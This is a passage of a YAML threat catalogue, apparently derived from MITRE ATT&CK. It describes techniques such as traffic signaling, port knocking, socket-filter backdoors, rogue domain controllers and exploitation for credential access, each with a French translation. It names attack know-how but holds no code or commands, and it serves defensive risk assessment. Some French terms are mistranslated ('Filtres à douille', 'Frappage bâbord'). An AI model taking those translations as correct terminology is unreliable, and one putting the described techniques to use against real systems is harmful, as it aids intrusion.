      to open a closed service port such as telnet, or to trigger module modification
      of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries
      may use crafted packets to attempt to connect to one or more (open or closed)
      ports, but may also attempt to connect to a router interface, broadcast, and
      network address IP on the same port in order to achieve their goals and objectives.(Citation:
      Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco
      Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices,
      adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
      due to the monolithic nature of the architecture.


      Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.
      Wake-on-LAN is a hardware feature that allows a powered down system to be powered
      on, or woken up, by sending a magic packet to it. Once the system is powered
      on, it may become a target for lateral movement.(Citation: Bleeping Computer
      - Ryuk WoL)(Citation: AMD Magic Packet)'
    translations:
      fr:
        name: Feux de signalisation
        description: "Les adversaires peuvent utiliser des feux de signalisation pour\
          \ dissimuler des ports ouverts ou d\u2019autres fonctionnalit\xE9s malveillantes\
          \ utilis\xE9es pour la persistance ou le commandement et le contr\xF4le.\
          \ Le signalisation implique l\u2019utilisation d\u2019une valeur magique\
          \ ou d\u2019une s\xE9quence qui doit \xEAtre envoy\xE9e \xE0 un syst\xE8\
          me pour d\xE9clencher une r\xE9ponse sp\xE9ciale, comme ouvrir un port ferm\xE9\
          \ ou ex\xE9cuter une t\xE2che malveillante. Cela peut prendre la forme d\u2019\
          envoyer une s\xE9rie de paquets avec certaines caract\xE9ristiques avant\
          \ qu\u2019un port ne soit ouvert, que l\u2019adversaire peut utiliser pour\
          \ le commandement et le contr\xF4le. Habituellement, cette s\xE9rie de paquets\
          \ consiste en des tentatives de connexion \xE0 une s\xE9quence pr\xE9d\xE9\
          finie de ports ferm\xE9s (c\u2019est-\xE0-dire [Port Knocking](https://attack.mitre.org/techniques/T1205/001)),\
          \ mais peut impliquer des drapeaux inhabituels, des cha\xEEnes sp\xE9cifiques\
          \ ou d\u2019autres caract\xE9ristiques uniques. Apr\xE8s la s\xE9quence,\
          \ l\u2019ouverture d\u2019un port peut \xEAtre r\xE9alis\xE9e par le pare-feu\
          \ bas\xE9 sur l\u2019h\xF4te, mais peut aussi \xEAtre impl\xE9ment\xE9e\
          \ par un logiciel personnalis\xE9.\n\nLes adversaires peuvent \xE9galement\
          \ communiquer avec un port d\xE9j\xE0 ouvert, mais le service qui \xE9coute\
          \ sur ce port ne r\xE9pondra qu\u2019aux commandes ou d\xE9clenchera d\u2019\
          autres fonctionnalit\xE9s malveillantes que si la ou les valeurs magiques\
          \ appropri\xE9es d\xE9passent.\n\nL\u2019observation des paquets de signaux\
          \ pour d\xE9clencher la communication peut \xEAtre r\xE9alis\xE9e par diff\xE9\
          rentes m\xE9thodes. Un moyen, initialement impl\xE9ment\xE9 par Cd00r (Citation\
          \ : Hartrell cd00r 2002), est d\u2019utiliser les biblioth\xE8ques libpcap\
          \ pour rechercher les paquets en question. Une autre m\xE9thode exploite\
          \ les sockets bruts, ce qui permet au malware d\u2019utiliser des ports\
          \ d\xE9j\xE0 ouverts pour d\u2019autres programmes.\n\nSur les appareils\
          \ r\xE9seau, les adversaires peuvent utiliser des paquets con\xE7us pour\
          \ activer [Authentification des dispositifs r\xE9seau](https://attack.mitre.org/techniques/T1556/004)\
          \ pour des services standards propos\xE9s par l\u2019appareil tels que le\
          \ telnet.  Un tel signalement peut \xE9galement \xEAtre utilis\xE9 pour\
          \ ouvrir un port de service ferm\xE9 tel que telnet, ou pour d\xE9clencher\
          \ la modification de modules d\u2019implants de malwares sur l\u2019appareil,\
          \ ajoutant, supprimant ou modifiant des capacit\xE9s malveillantes.  Les\
          \ adversaires peuvent utiliser des paquets con\xE7us pour tenter de se connecter\
          \ \xE0 un ou plusieurs ports (ouverts ou ferm\xE9s), mais peuvent aussi\
          \ tenter de se connecter \xE0 une interface de routeur, une diffusion et\
          \ une adresse r\xE9seau IP sur le m\xEAme port afin d\u2019atteindre leurs\
          \ buts et objectifs. (Citation : Cisco Synful Knock Evolution)(Citation\
          \ : Mandiant - Synful Frappe)(Citation : Attaques d\u2019appareils h\xE9\
          rit\xE9s du blog Cisco)  Pour permettre ce signalisation sur les dispositifs\
          \ embarqu\xE9s, les adversaires doivent d\u2019abord obtenir et exploiter\
          \ [Patch System Image](https://attack.mitre.org/techniques/T1601/001) en\
          \ raison de la nature monolithique de l\u2019architecture.\n\nLes adversaires\
          \ peuvent \xE9galement utiliser la fonction Wake-on-LAN pour activer les\
          \ syst\xE8mes \xE9teints. Wake-on-LAN est une fonctionnalit\xE9 mat\xE9\
          rielle qui permet d\u2019allumer ou de r\xE9veiller un syst\xE8me \xE9teint\
          \ en lui envoyant un paquet magique. Une fois le syst\xE8me allum\xE9, il\
          \ peut devenir une cible pour les mouvements lat\xE9raux. (Citation : Ordinateur\
          \ bip - Ryuk WoL)(Citation : AMD Magic Packet)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.001
    ref_id: T1205.001
    name: Port Knocking
    description: 'Adversaries may use port knocking to hide open ports used for persistence
      or command and control. To enable a port, an adversary sends a series of attempted
      connections to a predefined sequence of closed ports. After the sequence is
      completed, opening a port is often accomplished by the host based firewall,
      but could also be implemented by custom software.


      This technique has been observed both for the dynamic opening of a listening
      port as well as the initiating of a connection to a listening server on a different
      system.


      The observation of the signal packets to trigger the communication can be conducted
      through different methods. One means, originally implemented by Cd00r (Citation:
      Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
      in question. Another method leverages raw sockets, which enables the malware
      to use ports that are already open for use by other programs.

      https://attack.mitre.org/techniques/T1205/001'
    translations:
      fr:
        name: "Frappage b\xE2bord"
        description: "Les adversaires peuvent utiliser le port knocking pour dissimuler\
          \ les ouvertures et servir \xE0 la persistance ou au commandement et au\
          \ contr\xF4le. Pour activer un port, un adversaire envoie une s\xE9rie de\
          \ tentatives de connexion \xE0 une s\xE9quence pr\xE9d\xE9finie de ports\
          \ ferm\xE9s. Une fois la s\xE9quence termin\xE9e, l\u2019ouverture d\u2019\
          un port est souvent r\xE9alis\xE9e par le pare-feu h\xF4te, mais peut aussi\
          \ \xEAtre impl\xE9ment\xE9e par un logiciel personnalis\xE9.\n\nCette technique\
          \ a \xE9t\xE9 observ\xE9e \xE0 la fois pour l\u2019ouverture dynamique d\u2019\
          un port d\u2019\xE9coute et pour l\u2019initiation d\u2019une connexion\
          \ \xE0 un serveur d\u2019\xE9coute sur un autre syst\xE8me.\n\nL\u2019observation\
          \ des paquets de signaux pour d\xE9clencher la communication peut \xEAtre\
          \ r\xE9alis\xE9e par diff\xE9rentes m\xE9thodes. Un moyen, initialement\
          \ impl\xE9ment\xE9 par Cd00r (Citation : Hartrell cd00r 2002), est d\u2019\
          utiliser les biblioth\xE8ques libpcap pour rechercher les paquets en question.\
          \ Une autre m\xE9thode exploite les sockets bruts, ce qui permet au malware\
          \ d\u2019utiliser des ports d\xE9j\xE0 ouverts pour d\u2019autres programmes.\n\
          https://attack.mitre.org/techniques/T1205/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.002
    ref_id: T1205.002
    name: Socket Filters
    description: 'Adversaries may attach filters to a network socket to monitor then
      activate backdoors used for persistence or command and control. With elevated
      permissions, adversaries can use features such as the `libpcap` library to open
      sockets and install filters to allow or disallow certain types of data to come
      through the socket. The filter may apply to all traffic passing through the
      specified network interface (or every interface if not specified). When the
      network interface receives a packet matching the filter criteria, additional
      actions can be triggered on the host, such as activation of a reverse shell.


      To establish a connection, an adversary sends a crafted packet to the targeted
      host that matches the installed filter criteria.(Citation: haking9 libpcap network
      sniffing) Adversaries have used these socket filters to trigger the installation
      of implants, conduct ping backs, and to invoke command shells. Communication
      with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation:
      exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May
      2020)


      Filters can be installed on any Unix-like platform with `libpcap` installed
      or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with
      `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER`
      options. Since the socket connection is not active until the packet is received,
      this behavior may be difficult to detect due to the lack of activity on a host,
      low CPU overhead, and limited visibility into raw socket usage.

      https://attack.mitre.org/techniques/T1205/002'
    translations:
      fr:
        name: "Filtres \xE0 douille"
        description: "Les adversaires peuvent attacher des filtres \xE0 un socket\
          \ r\xE9seau pour surveiller puis activer des portes d\xE9rob\xE9es utilis\xE9\
          es pour la persistance ou le commandement et contr\xF4le. Avec des permissions\
          \ \xE9lev\xE9es, les adversaires peuvent utiliser des fonctionnalit\xE9\
          s telles que la biblioth\xE8que \xAB libpcap \xBB pour ouvrir des sockets\
          \ et installer des filtres permettant ou non \xE0 certains types de donn\xE9\
          es de passer par le socket. Le filtre peut s\u2019appliquer \xE0 tout trafic\
          \ passant par l\u2019interface r\xE9seau sp\xE9cifi\xE9e (ou \xE0 toute\
          \ interface si elle n\u2019est pas sp\xE9cifi\xE9e). Lorsque l\u2019interface\
          \ r\xE9seau re\xE7oit un paquet correspondant aux crit\xE8res du filtre,\
          \ des actions suppl\xE9mentaires peuvent \xEAtre d\xE9clench\xE9es sur l\u2019\
          h\xF4te, comme l\u2019activation d\u2019un reverse shell.\n\nPour \xE9tablir\
          \ une connexion, un adversaire envoie un paquet con\xE7u \xE0 l\u2019h\xF4\
          te cibl\xE9 qui correspond aux crit\xE8res du filtre install\xE9. (Citation\
          \ : haking9 libpcap r\xE9seau snif) Les adversaires ont utilis\xE9 ces filtres\
          \ de socket pour d\xE9clencher l\u2019installation d\u2019implants, effectuer\
          \ des retro-ping et invoquer des coques de commande. La communication avec\
          \ ces filtres de socket peut \xE9galement \xEAtre utilis\xE9e en conjonction\
          \ avec le [Protocole Tunneling](https://attack.mitre.org/techniques/T1572).\
          \ (Citation : exatrack bpf filtre les portes d\xE9rob\xE9es passives)(Citation\
          \ : Leonardo Turla Penquin mai 2020)\n\nLes filtres peuvent \xEAtre install\xE9\
          s sur n\u2019importe quelle plateforme de type Unix avec 'libpcap' install\xE9\
          \ ou sur des h\xF4tes Windows utilisant 'Winpcap'.  Les adversaires peuvent\
          \ utiliser soit \xAB libpcap \xBB avec \xAB pcap_setfilter \xBB, soit la\
          \ fonction de biblioth\xE8que standard \xAB setsockopt \xBB avec les options\
          \ \xAB SO_ATTACH_FILTER \xBB. Puisque la connexion socket n\u2019est pas\
          \ active tant que le paquet n\u2019est pas re\xE7u, ce comportement peut\
          \ \xEAtre difficile \xE0 d\xE9tecter en raison de l\u2019absence d\u2019\
          activit\xE9 sur un h\xF4te, de la faible surcharge CPU et d\u2019une visibilit\xE9\
          \ limit\xE9e sur l\u2019utilisation brute des sockets.\nhttps://attack.mitre.org/techniques/T1205/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1207
    ref_id: T1207
    name: Rogue Domain Controller
    description: 'Adversaries may register a rogue Domain Controller to enable manipulation
      of Active Directory data. DCShadow may be used to create a rogue Domain Controller
      (DC). DCShadow is a method of manipulating Active Directory (AD) data, including
      objects and schemas, by registering (or reusing an inactive registration) and
      simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered,
      a rogue DC may be able to inject and replicate changes into AD infrastructure
      for any domain object, including credentials and keys.


      Registering a rogue DC involves creating a new server and nTDSDSA objects in
      the Configuration partition of the AD schema, which requires Administrator privileges
      (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity
      Mimikatz Guide)


      This technique may bypass system logging and security monitors such as security
      information and event management (SIEM) products (since actions taken on a rogue
      DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique
      may also be used to alter and delete replication and other associated metadata
      to obstruct forensic analysis. Adversaries may also utilize this technique to
      perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005)
      and/or manipulate AD objects (such as accounts, access control lists, schemas)
      to establish backdoors for Persistence. (Citation: DCShadow Blog)

      https://attack.mitre.org/techniques/T1207'
    translations:
      fr:
        name: "Contr\xF4leur de domaine malveillant"
        description: "Les adversaires peuvent enregistrer un contr\xF4leur de domaine\
          \ malveillant pour permettre la manipulation des donn\xE9es Active Directory.\
          \ DCShadow peut \xEAtre utilis\xE9 pour cr\xE9er un contr\xF4leur de domaine\
          \ (DC) malveillant. DCShadow est une m\xE9thode de manipulation des donn\xE9\
          es d\u2019Active Directory (AD), y compris les objets et les sch\xE9mas,\
          \ en enregistrant (ou en r\xE9utilisant un enregistrement inactif) et en\
          \ simulant le comportement d\u2019un DC. (Citation : Blog DCShadow) Une\
          \ fois enregistr\xE9, un DC malveillant peut \xEAtre capable d\u2019injecter\
          \ et de r\xE9pliquer des modifications dans l\u2019infrastructure AD pour\
          \ n\u2019importe quel objet de domaine, y compris les identifiants et les\
          \ cl\xE9s.\n\nEnregistrer un DC malveillant implique de cr\xE9er un nouveau\
          \ serveur et des objets nTDSDSA dans la partition de configuration du sch\xE9\
          ma AD, ce qui n\xE9cessite des privil\xE8ges administrateur (domaine ou\
          \ local du DC) ou le hachage KRBTGT. (Citation : Guide Adsecurity Mimikatz)\n\
          \nCette technique peut contourner les journaux syst\xE8me et les surveilleurs\
          \ de s\xE9curit\xE9 tels que les produits de gestion des informations et\
          \ \xE9v\xE9nements de s\xE9curit\xE9 (SIEM) (puisque les actions effectu\xE9\
          es sur un DC malveillant peuvent ne pas \xEAtre signal\xE9es \xE0 ces capteurs).\
          \ (Citation : Blog DCShadow) La technique peut \xE9galement \xEAtre utilis\xE9\
          e pour modifier et supprimer la r\xE9plication et d\u2019autres m\xE9tadonn\xE9\
          es associ\xE9es afin d\u2019entraver l\u2019analyse m\xE9dico-l\xE9gale.\
          \ Les adversaires peuvent \xE9galement utiliser cette technique pour effectuer\
          \ [injection d\u2019historique SID](https://attack.mitre.org/techniques/T1134/005)\
          \ et/ou manipuler des objets AD (tels que comptes, listes de contr\xF4le\
          \ d\u2019acc\xE8s, sch\xE9mas) afin d\u2019\xE9tablir des portes d\xE9rob\xE9\
          es pour la persistance. (Citation : Blog DCShadow)\nhttps://attack.mitre.org/techniques/T1207"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1210
    ref_id: T1210
    name: Exploitation of Remote Services
    description: "Adversaries may exploit remote services to gain unauthorized access\
      \ to internal systems once inside of a network. Exploitation of a software vulnerability\
      \ occurs when an adversary takes advantage of a programming error in a program,\
      \ service, or within the operating system software or kernel itself to execute\
      \ adversary-controlled code.\_A common goal for post-compromise exploitation\
      \ of remote services is for lateral movement to enable access to a remote system.\n\
      \nAn adversary may need to determine if the remote system is in a vulnerable\
      \ state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046)\
      \ or other Discovery methods looking for common, vulnerable software that may\
      \ be deployed in the network, the lack of certain patches that may indicate\
      \ vulnerabilities,  or security software that may be used to detect or contain\
      \ remote exploitation. Servers are likely a high value target for lateral movement\
      \ exploitation, but endpoint systems may also be at risk if they provide an\
      \ advantage or access to additional resources.\n\nThere are several well-known\
      \ vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple\
      \ SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications\
      \ that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662)\
      \ and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica\
      \ VMWare Code Execution Vulnerability 2021) Additionally, there have been a\
      \ number of vulnerabilities in VMware vCenter installations, which may enable\
      \ threat actors to move laterally from the compromised vCenter server to virtual\
      \ machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)\n\
      \nDepending on the permissions level of the vulnerable remote service an adversary\
      \ may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)\
      \ as a result of lateral movement exploitation as well.\nhttps://attack.mitre.org/techniques/T1210"
    translations:
      fr:
        name: "Exploitation des services \xE0 distance"
        description: "Les adversaires peuvent exploiter des services \xE0 distance\
          \ pour obtenir un acc\xE8s non autoris\xE9 aux syst\xE8mes internes une\
          \ fois dans un r\xE9seau. L\u2019exploitation d\u2019une vuln\xE9rabilit\xE9\
          \ logicielle survient lorsqu\u2019un adversaire profite d\u2019une erreur\
          \ de programmation dans un programme, un service, ou dans le logiciel ou\
          \ le noyau du syst\xE8me d\u2019exploitation lui-m\xEAme pour ex\xE9cuter\
          \ du code contr\xF4l\xE9 par l\u2019adversaire.\_Un objectif commun pour\
          \ l\u2019exploitation post-compromission des services \xE0 distance est\
          \ le d\xE9placement lat\xE9ral pour permettre l\u2019acc\xE8s \xE0 un syst\xE8\
          me distant.\n\nUn adversaire peut devoir d\xE9terminer si le syst\xE8me\
          \ distant est dans un \xE9tat vuln\xE9rable, ce qui peut se faire via [Network\
          \ Service Discovery](https://attack.mitre.org/techniques/T1046) ou d\u2019\
          autres m\xE9thodes de d\xE9couverte visant \xE0 rechercher des logiciels\
          \ courants et vuln\xE9rables pouvant \xEAtre d\xE9ploy\xE9s dans le r\xE9\
          seau, l\u2019absence de certains correctifs pouvant indiquer des vuln\xE9\
          rabilit\xE9s, ou des logiciels de s\xE9curit\xE9 pouvant d\xE9tecter ou\
          \ contenir une exploitation \xE0 distance. Les serveurs sont probablement\
          \ une cible de grande valeur pour l\u2019exploitation des mouvements lat\xE9\
          raux, mais les syst\xE8mes de terminaison peuvent \xE9galement \xEAtre \xE0\
          \ risque s\u2019ils offrent un avantage ou un acc\xE8s \xE0 des ressources\
          \ suppl\xE9mentaires.\n\nIl existe plusieurs vuln\xE9rabilit\xE9s bien connues\
          \ dans des services courants tels que SMB (Citation : CIS Multiple SMB Vulnerabilities)\
          \ et RDP (Citation : NVD CVE-2017-0176) ainsi que dans des applications\
          \ pouvant \xEAtre utilis\xE9es dans des r\xE9seaux internes tels que MySQL\
          \ (Citation : NVD CVE-2016-6662) et les services de serveurs web. (Citation\
          \ : NVD CVE-2014-7169)(Citation : Vuln\xE9rabilit\xE9 d\u2019ex\xE9cution\
          \ de code Ars Technica VMWare 2021) De plus, plusieurs vuln\xE9rabilit\xE9\
          s ont \xE9t\xE9 d\xE9tect\xE9es dans les installations VMware vCenter, qui\
          \ pourraient permettre aux acteurs malveillants de passer lat\xE9ralement\
          \ du serveur vCenter compromis vers des machines virtuelles ou m\xEAme vers\
          \ des hyperviseurs ESXi. (Citation : Broadcom VMSA-2024-0019)\n\nSelon le\
          \ niveau d\u2019autorisations du service distant vuln\xE9rable, un adversaire\
          \ peut atteindre l'[Exploitation pour l\u2019escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068)\
          \ \xE0 la suite de l\u2019exploitation lat\xE9rale des mouvements lat\xE9\
          raux.\nhttps://attack.mitre.org/techniques/T1210"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1211
    ref_id: T1211
    name: Exploitation for Stealth
    description: "Adversaries may exploit vulnerabilities to evade detection by hiding\
      \ activity, suppressing logging, or operating within trusted or unmonitored\
      \ components. \n\nAdversaries may exploit a system or application vulnerability\
      \ to avoid detection while maintaining access within an environment. Exploitation\
      \ occurs when an adversary leverages a programming flaw to execute code in a\
      \ manner that minimizes visibility or blends in with legitimate activity. \n\
      \nRather than directly disabling defenses, adversaries may use exploitation\
      \ to circumvent monitoring and logging mechanisms. This can include abusing\
      \ vulnerabilities in logging pipelines, security tools, or cloud infrastructure\
      \ to evade audit trails, suppress alerts, or operate without generating telemetry.\
      \ \n\nAdversaries may identify these opportunities through prior reconnaissance\
      \ or by performing discovery of security controls after initial access. In some\
      \ cases, vulnerabilities in SaaS or public cloud environments may be exploited\
      \ to evade logging, obscure activity, or deploy infrastructure that remains\
      \ hidden from standard monitoring tools.(Citation: Bypassing CloudTrail in AWS\
      \ Service Catalog)(Citation: GhostToken GCP flaw)\nhttps://attack.mitre.org/techniques/T1211"
    translations:
      fr:
        name: "Exploitation pour la discr\xE9tion"
        description: "Les adversaires peuvent exploiter les vuln\xE9rabilit\xE9s pour\
          \ \xE9chapper \xE0 la d\xE9tection en cachant une activit\xE9, en supprimant\
          \ la journalisation ou en op\xE9rant \xE0 l\u2019int\xE9rieur de composants\
          \ fiables ou non surveill\xE9s. \n\nLes adversaires peuvent exploiter une\
          \ vuln\xE9rabilit\xE9 d\u2019un syst\xE8me ou d\u2019une application pour\
          \ \xE9viter la d\xE9tection tout en maintenant l\u2019acc\xE8s dans un environnement.\
          \ L\u2019exploitation se produit lorsqu\u2019un adversaire exploite une\
          \ faille de programmation pour ex\xE9cuter du code de mani\xE8re \xE0 minimiser\
          \ la visibilit\xE9 ou \xE0 s\u2019int\xE9grer \xE0 une activit\xE9 l\xE9\
          gitime. \n\nPlut\xF4t que de d\xE9sactiver directement les d\xE9fenses,\
          \ les adversaires peuvent utiliser l\u2019exploitation pour contourner les\
          \ m\xE9canismes de surveillance et de journalisation. Cela peut inclure\
          \ l\u2019exploitation des vuln\xE9rabilit\xE9s dans les pipelines de journalisation,\
          \ les outils de s\xE9curit\xE9 ou l\u2019infrastructure cloud pour contourner\
          \ les audits, supprimer les alertes ou fonctionner sans g\xE9n\xE9rer de\
          \ t\xE9l\xE9m\xE9trie. \n\nLes adversaires peuvent identifier ces opportunit\xE9\
          s par reconnaissance pr\xE9alable ou en d\xE9couvrant des contr\xF4les de\
          \ s\xE9curit\xE9 apr\xE8s un acc\xE8s initial. Dans certains cas, des vuln\xE9\
          rabilit\xE9s dans les environnements SaaS ou cloud public peuvent \xEAtre\
          \ exploit\xE9es pour \xE9viter la journalisation, obscurcir les activit\xE9\
          s ou d\xE9ployer des infrastructures qui restent cach\xE9es aux outils de\
          \ surveillance standards. (Citation : Contourner CloudTrail dans le catalogue\
          \ de services AWS)(Citation : d\xE9faut GhostToken GCP)\nhttps://attack.mitre.org/techniques/T1211"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1212
    ref_id: T1212
    name: Exploitation for Credential Access
    description: "Adversaries may exploit software vulnerabilities in an attempt to\
      \ collect credentials. Exploitation of a software vulnerability occurs when\
      \ an adversary takes advantage of a programming error in a program, service,\
      \ or within the operating system software or kernel itself to execute adversary-controlled\
      \ code.\_\n\nCredentialing and authentication mechanisms may be targeted for\
      \ exploitation by adversaries as a means to gain access to useful credentials\
      \ or circumvent the process to gain authenticated access to systems. One example\
      \ of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos\
      \ tickets using domain user permissions.(Citation: Technet MS14-068)(Citation:\
      \ ADSecurity Detecting Forged Tickets) Another example of this is replay attacks,\
      \ in which the adversary intercepts data packets sent between parties and then\
      \ later replays these packets. If services don't properly validate authentication\
      \ requests, these replayed packets may allow an adversary to impersonate one\
      \ of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd\
      \ Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight\
      \ Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud\
      \ environments as well. For example, adversaries have exploited vulnerabilities\
      \ in public cloud infrastructure that allowed for unintended authentication\
      \ token creation and renewal.(Citation: Storm-0558 techniques for unauthorized\
      \ email access)\n\nExploitation for credential access may also result in Privilege\
      \ Escalation depending on the process targeted or credentials obtained.\nhttps://attack.mitre.org/techniques/T1212"
    translations:
      fr:
        name: "Exploitation pour l\u2019acc\xE8s aux accr\xE9ditations"
        description: "Les adversaires peuvent exploiter des vuln\xE9rabilit\xE9s logicielles\
          \ pour tenter de collecter des identifiants. L\u2019exploitation d\u2019\
          une vuln\xE9rabilit\xE9 logicielle survient lorsqu\u2019un adversaire profite\
          \ d\u2019une erreur de programmation dans un programme, un service, ou dans\
          \ le logiciel ou le noyau du syst\xE8me d\u2019exploitation lui-m\xEAme\
          \ pour ex\xE9cuter du code contr\xF4l\xE9 par l\u2019adversaire.\_\n\nLes\
          \ m\xE9canismes d\u2019accr\xE9ditation et d\u2019authentification peuvent\
          \ \xEAtre cibl\xE9s par les adversaires comme moyen d\u2019acc\xE9der \xE0\
          \ des identifiants utiles ou contourner le processus pour acc\xE9der aux\
          \ syst\xE8mes authentifi\xE9s. Un exemple est \xAB MS14-068 \xBB, qui vise\
          \ Kerberos et peut \xEAtre utilis\xE9 pour falsifier des tickets Kerberos\
          \ en utilisant les permissions des utilisateurs du domaine. (Citation :\
          \ Technet MS14-068)(Citation : D\xE9tection de la S\xE9curit\xE9 des Tickets\
          \ Falsifi\xE9s) Un autre exemple est celui des attaques \xE0 relecture,\
          \ dans lesquelles l\u2019adversaire intercepte les paquets de donn\xE9es\
          \ envoy\xE9s entre les parties puis les rejoue plus tard. Si les services\
          \ ne valident pas correctement les demandes d\u2019authentification, ces\
          \ paquets rejou\xE9s peuvent permettre \xE0 un adversaire de se faire passer\
          \ pour l\u2019une des parties et d\u2019obtenir un acc\xE8s ou des privil\xE8\
          ges non autoris\xE9s. (Citation : Attaque de rediffusion de Bugcrowd)(Citation\
          \ : Attaque de reprise Comparitech)(Citation : Attaque de rediffusion de\
          \ Microsoft Midnight Blizzard)\n\nUne telle exploitation a \xE9galement\
          \ \xE9t\xE9 d\xE9montr\xE9e dans des environnements cloud. Par exemple,\
          \ des adversaires ont exploit\xE9 des vuln\xE9rabilit\xE9s dans l\u2019\
          infrastructure cloud publique qui ont permis la cr\xE9ation et le renouvellement\
          \ involontaires de jetons d\u2019authentification. (Citation : Techniques\
          \ Storm-0558 pour l\u2019acc\xE8s non autoris\xE9 aux e-mails)\n\nL\u2019\
          exploitation pour acc\xE9der aux identifiants peut \xE9galement entra\xEE\
          ner une escalade de privil\xE8ges selon le processus cibl\xE9 ou les identifiants\
          \ obtenus.\nhttps://attack.mitre.org/techniques/T1212"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213
    ref_id: T1213
    name: Data from Information Repositories
    description: "Adversaries may leverage information repositories to mine valuable\
      \ information. Information repositories are tools that allow for storage of\
      \ information, typically to facilitate collaboration or information sharing\
      \ between users, and can store a wide variety of data that may aid adversaries\
      \ in further objectives, such as Credential Access, Lateral Movement, or Defense\
      \ Evasion, or direct access to the target information. Adversaries may also\
      \ abuse external sharing features to share sensitive documents with recipients\
      \ outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).\
      \ \n\nThe following is a brief list of example information that may hold potential\
      \ value to an adversary and may also be found on an information repository:\n\
      \n* Policies, procedures, and standards\n* Physical / logical network diagrams\n\
      * System architecture diagrams\n* Technical system documentation\n* Testing\
      \ / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\
      \ \n* Work / project schedules\n* Source code snippets\n* Links to network shares\
      \ and other internal resources\n* Contact or other sensitive information about\
      \ business partners and customers, including personally identifiable information\
      \ (PII) \n\nInformation stored in a repository may vary based on the specific\
      \ instance or environment. Specific common information repositories include\
      \ the following:\n\n* Storage services such as IaaS databases, enterprise databases,\
      \ and more specialized platforms such as customer relationship management (CRM)\
      \ databases \n* Collaboration platforms such as SharePoint, Confluence, and\
      \ code repositories\n* Messaging platforms such as Slack and Microsoft Teams\
      \ \n\nIn some cases, information repositories have been improperly secured,\
      \ typically by unintentionally allowing for overly-broad access by all users\
      \ or even public access to unauthenticated users. This is particularly common\
      \ with cloud-native or cloud-hosted services, such as AWS Relational Database\
      \ Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro\
      \ Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)\nhttps://attack.mitre.org/techniques/T1213"
    translations:
      fr:
        name: "Donn\xE9es provenant des d\xE9p\xF4ts d\u2019information"
        description: "Les adversaires peuvent exploiter des d\xE9p\xF4ts d\u2019informations\
          \ pour exploiter des informations pr\xE9cieuses. Les d\xE9p\xF4ts d\u2019\
          information sont des outils permettant le stockage d\u2019informations,\
          \ g\xE9n\xE9ralement pour faciliter la collaboration ou le partage d\u2019\
          informations entre utilisateurs, et peuvent stocker une grande vari\xE9\
          t\xE9 de donn\xE9es pouvant aider les adversaires dans de futurs objectifs,\
          \ tels que l\u2019acc\xE8s aux accr\xE9ditations, le d\xE9placement lat\xE9\
          ral, l\u2019\xE9vasion de la d\xE9fense ou l\u2019acc\xE8s direct aux informations\
          \ cibl\xE9es. Les adversaires peuvent \xE9galement abuser de fonctionnalit\xE9\
          s de partage externes pour partager des documents sensibles avec des destinataires\
          \ ext\xE9rieurs \xE0 l\u2019organisation (par exemple, [Transf\xE9rer les\
          \ donn\xE9es vers un compte cloud](https://attack.mitre.org/techniques/T1537)).\
          \ \n\nVoici une br\xE8ve liste d\u2019exemples d\u2019informations pouvant\
          \ avoir une valeur potentielle pour un adversaire et qui peuvent \xE9galement\
          \ \xEAtre trouv\xE9es dans un d\xE9p\xF4t d\u2019informations :\n\n* Politiques,\
          \ proc\xE9dures et normes\n* Diagrammes de r\xE9seau physique / logique\n\
          * Diagrammes d\u2019architecture syst\xE8me\n* Documentation technique du\
          \ syst\xE8me\n* Identifiants de test / d\xE9veloppement (c\u2019est-\xE0\
          -dire, [identifiants non s\xE9curis\xE9s](https://attack.mitre.org/techniques/T1552))\
          \ \n* Plannings de travail / projets\n* Extraits de code source\n* Liaisons\
          \ vers les partages r\xE9seau et autres ressources internes\n* Contact ou\
          \ autres informations sensibles concernant les partenaires commerciaux et\
          \ les clients, y compris des informations personnelles identifiables (PII)\
          \ \n\nLes informations stock\xE9es dans un d\xE9p\xF4t peuvent varier selon\
          \ l\u2019instance ou l\u2019environnement sp\xE9cifique. Les d\xE9p\xF4\
          ts d\u2019information communs sp\xE9cifiques incluent les suivants :\n\n\
          * Services de stockage tels que les bases de donn\xE9es IaaS, les bases\
          \ de donn\xE9es d\u2019entreprise et des plateformes plus sp\xE9cialis\xE9\
          es telles que la gestion de la relation client (CRM) \n* Plateformes de\
          \ collaboration telles que SharePoint, Confluence et d\xE9p\xF4ts de code\n\
